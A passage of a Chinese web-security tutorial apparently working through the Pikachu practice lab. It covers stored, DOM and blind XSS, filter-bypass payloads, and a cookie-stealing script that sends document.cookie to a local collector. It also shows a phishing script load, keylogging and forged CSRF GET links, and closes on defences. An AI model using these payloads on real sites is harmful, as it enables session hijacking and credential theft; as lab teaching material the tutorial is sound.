点击提交，我们发现语句被执行出现了弹窗。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ffffc3ede76e64fb8821d4c662d257ac1.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
我们进行页面切换，然后再次切换回来，发现弹窗依然存在，说明我们输入的语句已经被存储起来。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7ae7eb1ea883475183c537c8073a958b.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
道理与反射性差不多，唯一区别就是永久和一次性。

#### 3.2.5Dom型XSS演示

工欲善其事必先利其器，在了解Dom型xss，我们先了解什么是DOM。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F405062d96f6046d29cc15f55c59e8666.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_19%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

通过JavaScript，可以重构整个HTML文档。可以添加、移除、改变或重排页面上的项目。-
要改变页面的某个东西，JavaScript 就需要获得对HTML文档中所有元素进行访问的入口。这个入口，连同对HTML元索进行添加、移动、改变或移除的方法和属性，都是通过文档对象模型来获得的( DOM) 。-
所以，你可以把DOM理解为一个一个访问HTML的标准编程接口。-
可以自己看一个具体的栗子：[w3school HTML DOM](https://www.w3school.com.cn/js/js_htmldom.asp)-
打开DOM型xss，在输入框中输入一串字符。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fa63afc6790274e33bd9f6056708d6449.png)-
显示结果是what do you see?，看起来应该是A标签，打开页面源码，CTRL+F搜索这串字符，看一下它具体是做了什么操作。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbad088432aa146cc89e3c37ca24ba703.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
输入的字符串，被拼接到了a标签当中。-
判断此处是否有xss漏洞，与之前思路一样。先确认输入点，输入就是input也就是输入框。输出的话DOM是纯前端操作，输出也是前端输出。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fb7e8986ae3134fc3a6264e0b1448da0b.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
蓝框框选的就是我们的输入，我们把这条语句拿出来分析，利用输入构造一个闭合。

    <a href='"+str+"'>what do you see?</a>
    
        

我们还是输入一个弹窗，在input输入`#' onclick<span style="background:#ffff00">="alert(666)”></span>`-
构成a标签闭合，且嵌入一个弹窗。`<a href='#' onclick="alert(666)">'>what do you see?</a>`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff9753b3aa9ea487589876ea47cc364ce.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
属于低危漏洞，好像比较鸡肋，但是前端编写各种各样，还是需要注意的。-
**DOM型xss-x**-
xss-x就属于一个例外的例子。-
在输入框输入字符，并点击进行提交。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8e350258243a44329ce72f2d48c71254.png)-
同样我们要看它的具体操作是什么，打开页面源码进行查看。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc740e368625b48f495edca7c2c61a7e7.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
它的输入实际上是从url上获取的，这就类似反射性。-
我们还是对其进行闭合，与之前一样是a标签闭合。在input输入`#' onclick="alert(666)”>`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F52158cacb6dc42efa9eb646b1da52658.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
点击之后，产生一个666的弹窗。

#### 3.2.6XSS盲打演示和原理分析

<span style="background:#ffff00">xss盲打指的是一种攻击场景</span>。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6e7681bafd6549898e56bcbb1eac2707.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
<span style="background:#ffff00">也就是说只有后台会看到前端输入的内容。从前端无法判断是否存在XSS ,怎么办?-</span>
<span style="background:#ffff00">不管3721，往里面插XSS代码，然后等待,可能会有惊喜!-</span>
<span style="background:#ffff00">由于是后端,可能安全考虑不太严格。当管理员登录时，就会被X !-</span>
打开xss之盲打，随意输入看看是什么效果。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fcf69bfb5bccd401caa3888a7acb1291e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
我们输入的内容并不会在前端输出，看起来应该是存到了后台，也就是说可能只有管理员可以看。-
我们输入`<script>alert('xni')</script>`，设置一个弹窗，看看管理员在后台登陆上，是否会被x到。如果被x到这种场景就叫做盲打。-
输入之后提交，点击提示，登录管理员网址。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2f648fc5ca7b424f9c8a5ebd50b16662.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_11%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
输入用户密码后点击登录。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F4c53c0db40fe4c9bb65232a27dd7dc9e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_15%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
我们可以发现后台管理员被x到。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fa3aeaea96a664c4d8a1e71bf27945692.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3a69247e0caa48758f8153d77faaf410.png)-
这种情况就是xss盲打，对攻击者来说只是尝试的输入，并不知道后台是否被输出，只是尝试的输入跨站脚本。管理员被x到，攻击者成功。这种危害比较大，如果在前端输入一段盗取cookie的脚本，管理员一登陆，管理员的cookie就会被获取。攻击者就可以伪装管理员登陆后台，后台的权限就大了。

#### 3.2.7XSS的过滤和绕过( filter&htmlspecialchars )

**XSS绕过-过滤-转换**-
0，前端限制绕过，直接抓包重放，或者修改html前端代码-
1,大小写，比如: `<SCRIPT> aLeRT(111)</sCRIpt>`-
2，拼凑: `<scri<script> pt> alert(111)</scri</script> pt>`-
3，使用注释进行干扰: `<scri<!--test--> pt> alert(111)</sc <--test--> ript>`

**XSS绕过-过滤-编码**-
核心思路:

> 后台过滤了特殊字符,比如< script>标签，但该标签可以被各种编码，后台不一定会过滤-
> 当浏览器对该编码进行识别时，会翻译成正常的标签，从而执行.-
> 在使用编码时需要注意编码在输出点是否会被正常识别和翻译!

栗子1：-
`< img src=x onerror=”alert( xss )"`将alert(‘xss’ )进行URL编码,可以执行吗

    <img src=x onerror= " alert%28%27xss%27%29" />
    
        

不可以，因为这些属性标签并不会正常解析这些编码。

栗子2 :-
使用事件属性onxxx();-
`<img src=x onerror=" alert('xss')" />`可以把alert("xss )进行html编码

    <img srC=X onerror=" &#97;&# 108;&#101;&#114;&# 116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;”/>
    <img src=xonmouseover= "&#97;&l# 108;&# 101;&#114;&#116;&#40;&#39;&#120;&l#115;&#115;&#39;&#41;"/>
    
        

可以执行。事件标签里面并不会执行标签里面的代码。-
**XSS绕过的姿势有很多取决于你的思路和对前端技术的掌握程度**-
打开xss之过滤我们随意输入一串字符`<script>;'#@`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8762a8bfb8a149f39d34e08d1e176a95.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_14%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
我们打开页面源码查看![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe50ca9dc30fa47eaa99134d65be99a11.png)-
我们输入的script应该是被x掉了。我们尝试大小写混合，看看能不能绕过。

    <scRIPt>alert(666)</ScrIpt>
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F870ebe429b604f6588be41328c1fb8c1.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
查看代码我们发现只对小写的script进行了过滤，我们也可以使用img标签。

    <img src=x onerror="alert(666)">
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fb247de0bed4247439ae167ecdfdb8ffa.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
**XSS绕过关于htmlspecialchars()函数**

htmlspecialchars()函数把预定义的字符转换为HTML实体。-
预定义的字符是:

> &(和号)成为&-
> "(双引号)成为"-
> '(单引号)成为'-
> <(小于)成为<-
> ‘>’(大于)成为>

可用的引号类型:

> ENT\_ COMPAT -默认。仅编码双引号。-
> ENT QUOTES -编码双引号和单引号。-
> ENT NOQUOTES -不编码任何引号。

打开xss之html\*\*\*\*\*\*\*\*\*\*\*-
我们还是先输入一段字符串66666’“<>#$%![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F10d174087db14ade80531dc766dab071.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_15%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
提交之后我们看源码![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe0c2f4f3c2f94aa1997dc5d96eb2e1dd.png)-
我们发现除了单引号其他的特殊字符都进行了编码，我们可以输入`q' onclick='alert(666)'`第一个单引号是对前面进行闭合。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6a2626476c3d400c8194c59d4c35d5f9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

#### 3.2.8XSS输出在href和js中的案例分析

打开xss之herf，输入Javascript:alert(666)，不含有特殊字符。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fee719dbd304941e8b0ce9ce8564f2652.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_13%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
我们查看页内源码![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff6690fe4268e4075af46e88dd0bcb3d1.png)在a标签的herf中，我们返回页面点击返回的蓝色字体。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7189ee79e47f4920b998f908c9e2547e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
alert被执行，出现弹窗。在这里我们可以做出相应防范，只允许http,https，其次在进行htmlspecialchars处理。-
打开xss之js，我们随意输入然后查看页内原码。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc0fb80edddaf46c8ab7425a4a1261eff.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_18%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
我们输入tmac-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7e5d8b62dfb4449195101caa4a09b3fe.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
我们尝试造成闭合，输入`x'</script><script>alert('xss')</script>`，先将前面的script闭合再插入我们自己的语句。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F15ace2b8f9654a37b33071196d3e97af.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

#### 3.2.9XSS的危害-获取cookie的原理和演示

**get型xss利用**-
在管理工具中打开xss后台![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F00e2790ce17d42c68fe6a06e133850fa.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_18%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
数据库用户名与密码，要改正确，或者直接把自己的改成root，root。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff8d42b7f8ba54620b21831e6460a7f9f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_19%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
登陆之后，点击cookie收集，显示一个结果，默认没有数据。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F09de783262864b6cb63138ba60b90ac6.png)-
打开反射型xss(get)，首先先解决字符长度的问题，3.2.3有介绍不再赘述了，之前我们输入payload出现弹窗，我们这次输入一个比较复杂的payload，目的就是为了获取用户本地的cookie，发送到我们的xss后台。

    <script>document.location = 'http://127.0.0.1/pikachu-master/pikachu-master/pkxss/xcookie/cookie.php?cookie=' +document.cookie;</script>
    
    
        

这里的payload需要自己修改，由于都是本地，全部改成127.0.0.1即可，后面就是www后的路径。我自己phpstudy的www后的路径为pikachu-master/pikachu-master/pkxss/xcookie/cookie.php，注意一下需要修改这两个文件中的代码。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc2079fdf03ce4d5aaee2cee2052c8dea.png)

执行之后，跳回了首页。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F9eca8b9b73ad45a2a1fca41434f24ee0.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
打开xss后台，刷新，显示获取cookie。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F613b6969bf82471a85e944339ba73c6e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
**postxss**-
输入账号密码登录，页面跳转，输入字符，不难发现并没有在url中提交参数。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F67b9d374f7c84bbe88652672026163af.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
打开burp查看抓包。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fdbd41ee23ca54a4d9fce32a4c84d8820.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
我们发现message是通过请求体返回，通过post方式传到后台。这样的话是不能把恶意代码嵌入url中。-
POST型XSS获取cookie原理-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe41fb37c84cf41c49532f87f16977cb0.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

我们需要自己搭一个恶意站点，然后在网站上放一个post表单，将存放POST表单的链接发送给受害者，诱导受害者点击。 这个POST表单会自动向漏洞服务器提交一个POST请求，实现受害者帮我们提交POST请求的目的。我们只需要诱导受害者点击上面的链接就能窃取用户的Cookie。

#### 3.2.10XSS危害-XSS进行钓鱼的原理和演示

钓鱼思路：-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F365a36f1b85e4915912f80427bd1d858.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

打开xss钓鱼后台，打开存储型xss，输入`<script src="http://127.0.0.1/pikachu-master/pkxss/xfish/fish.php"></script>`，页面会出现弹窗，输入账号密码。当页面刷新时依然存在弹窗，所有访问者都会遇到弹窗，输入账号密码后，数据被存入后台，打开xss后台即可查看钓鱼数据。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F30afcb0f98dd467190e66854e1e09e70.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

#### 3.2.11XSS危害XSS获取键盘记录原理和演示

**跨域：**-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F4eb4c510c45f4ac6beeb191b1a6fbab8.png)-
当协议、主机(主域名，子域名)、端口中的任意一一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，成为跨域操作。-
**跨域同源策略**-
了安全考虑，所有的浏览器都约定了"同源策略”， 同源策略规定，两个不同域名之间不能使用JS进行相互操作。比如: x.com域名下的javascrip并不能操作y.com域下的对象。-
如果想要跨域操作,则需要管理员进行特殊的配置。-
比如通过: header( “Access -Control Allow- Origin:x.com” )指定。-
Tips:下面这些标签跨域加载资源(资源类型是有限制的)是不受同源策略限制的。

\`

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbd73867d83944fb0aa5967e4448061b9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_15%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
提交之后，这段js代码就被嵌入到了页面当中。打开rkserver，设置一个header，允许跨域访问。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F48fc2599980b481994a5252ed06a05fd.png)-
打开控制台，在页面上随意输入，可以看到请求。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fccda91ae30544aafa90b471692a36005.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
在页面上，随意进行输入。在后台查看，可以看到键盘敲击被记录。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F778aa1b29ccd443580a703a258c8f5bb.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_19%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

#### 3.2.12XSS常见防范措施

总的原则:输入做过滤,输出做转义-
过滤:根据业务需求进行过滤，比如输入点要求输入手机号，则只允许输入手机号格式的数字。-
转义:所有输出到前端的数据都根据输出点进行转义,比如输出到html中进行htm|实体转义,输入到JS里面的进行js转义。

## 3.3CSRF（跨站请求伪造漏洞）

#### 3.3.1CSRF漏洞概述

Cross-site request forgery简称为"CSRF" 。-
<span style="background:#ffff00">在CSRF的攻击场景中攻击者会伪造一个请求(这个请求一般是一 个链接)</span>-
然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击也就完成了。-
所以CSRF攻击也被称为为<span style="background:#ffff00">" one click "攻击</span>。-
为了方便理解，举个栗子理解一下![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6b82b7e297f2410ea6a5af26a7c3a851.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
正常情况下，lucy登录后，编辑好修改的内容，点击提交即可完成个人信息的修改-
链接url：http://192.168.112.200/ant/vulnerabilities/csrf/csrfget/csrf\_ mem\_ edit.php?sex= 女&phonenum= 12345678922&add=地球村504号&email=lucy@pi ka’ chu.com&submit=submit-
这个时候小白想要修改lucy的个人信息该怎么做？-
首先要有lucy的权限！-
小白将修改个人信息的请求伪造，引诱lucy在登陆的情况下点击，攻击就成功了。-
http://192.168.112.200/ant/vulnerbiltie./csrf/csrfget/csrf mem. edit.php?sex=女&phonenum= 13856564455&add=火星村111号&email=lucy@pikachu.com&tsubmit= submit-
**攻击成功条件：**

> 条件1 : xxx购物网站没有对个人信息修改的请求进行防CSRF处理，导致该请求容易被伪造。因此,我们判断一个网站是否存在CSRF漏洞 ,其实就是判断其对关键信息 (比如密码等敏感信息)的操作(增删改)是否容易被伪造。

> 条件2 : lucy在登录了后台的情况下,点击了小白发送的"埋伏"链接。如果lucy不在登录状态下,或者lucy更本就没有点击这个链接,则攻击不会成功。

csrf与xss的区别-
如果小白事先在xx网的首页如果发现了一个XSS漏洞,则小白可能会这样做：-
1,欺骗Iucy访问埋伏了XSS脚本(盗取cookie的脚本)的页面;-
2,Iucy中招，小白盗取到到ucy的cookie ;-
3,小白顺利登录到lucy的后台,小白自己修改lucy的相关信息;

CSRF是借用户的权限完成攻击,攻击者并没有拿到用户的权限,而XSS是直接盗取到了用户的权限,然后实施破坏。-
如何确认一个web系统存在csrf漏洞-
1，对目标网站增删改的地方进行标记,并观察其逻辑，判断请求是否可以被伪造-
–比如修改管理员账号时 ，并不需要验证旧密码 ，导致请求容易被伪造 ;-
–比如对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造;-
2.确认凭证的有效期(这个问题会提高CSRF被利用的概率)-
—虽然退出或者关闭了浏览器,但cookie仍然有效，或者session并没有及时过期,导致CSRF攻击变的简单

#### 3.3.2CSRF ( get/post )实验演示和解析

**CSRFget**-
我们假设我们是Lucy，登陆网站修改信息。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe71837a173074f53a113603882e0f062.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbcb38822733f45c9b6045275d3525f47.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
我们点击修改信息并提交，修改成功。我们打开burp查看抓到的数据包-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7e311a1317e2450896ca573b0c047360.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
这是我们的请求：GET/vul/csrf/csrfget/csrf\_get\_edit.phpsex=5&phonenum=54151&add=411&email=www&submit=submit-
我们并没有看到CSRF的token，说明并没有防CSRF的措施。-
修改get请求，将地址411修改为shanxi

    http://127.0.0.1/pikachu-master/vul/csrf/csrfget/csrf_get_edit.phpsex=5&phonenum=54151&add=shanxi&email=www&submit=submit
    
        

现在只需要把这个请求通过邮件或者信息发给Lucy，Lucy进行了访问。地址被更开。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F57d0b119509548d8b086a88276837ee9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
